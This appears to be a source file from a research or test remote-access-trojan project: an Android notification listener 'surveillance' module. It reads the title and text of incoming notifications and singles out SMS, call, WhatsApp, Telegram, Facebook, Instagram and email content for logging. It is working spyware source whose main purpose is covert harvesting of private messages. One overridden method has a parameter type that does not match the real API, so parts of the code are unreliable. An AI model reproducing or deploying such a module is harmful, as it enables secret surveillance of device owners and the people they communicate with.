package com.security.test.rat.modules.surveillance;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

/**
 * NotificationListenerService - Monitors system notifications
 * 
 * This service provides:
 * - Real-time notification monitoring
 * - Notification content extraction
 * - App usage pattern analysis
 * - Communication monitoring
 */
public class RATNotificationListenerService extends NotificationListenerService {
    
    private static final String TAG = "RATNotificationListener";
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "Notification listener service created");
    }
    
    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.i(TAG, "Notification listener connected");
    }
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            String title = sbn.getNotification().extras.getString("android.title");
            String text = sbn.getNotification().extras.getString("android.text");
            
            Log.i(TAG, String.format("Notification posted - Package: %s, Title: %s, Text: %s", 
                packageName, title, text));
            
            // Process notification for monitoring purposes
            processNotification(sbn);
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing posted notification", e);
        }
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            Log.d(TAG, "Notification removed - Package: " + packageName);
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing removed notification", e);
        }
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn, int rankingMap) {
        onNotificationRemoved(sbn);
    }
    
    private void processNotification(StatusBarNotification sbn) {
        try {
            // Extract notification details
            String packageName = sbn.getPackageName();
            String title = sbn.getNotification().extras.getString("android.title");
            String text = sbn.getNotification().extras.getString("android.text");
            long postTime = sbn.getPostTime();
            
            // Log important notifications (SMS, calls, etc.)
            if (isImportantNotification(packageName, title, text)) {
                Log.i(TAG, String.format("Important notification detected - Package: %s, Title: %s, Text: %s, Time: %d", 
                    packageName, title, text, postTime));
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing notification details", e);
        }
    }
    
    private boolean isImportantNotification(String packageName, String title, String text) {
        if (packageName == null || title == null || text == null) {
            return false;
        }
        
        // Check for SMS notifications
        if (packageName.contains("sms") || packageName.contains("messaging")) {
            return true;
        }
        
        // Check for call notifications
        if (packageName.contains("phone") || packageName.contains("dialer")) {
            return true;
        }
        
        // Check for social media notifications
        if (packageName.contains("whatsapp") || packageName.contains("telegram") || 
            packageName.contains("facebook") || packageName.contains("instagram")) {
            return true;
        }
        
        // Check for email notifications
        if (packageName.contains("gmail") || packageName.contains("email")) {
            return true;
        }
        
        return false;
    }
}
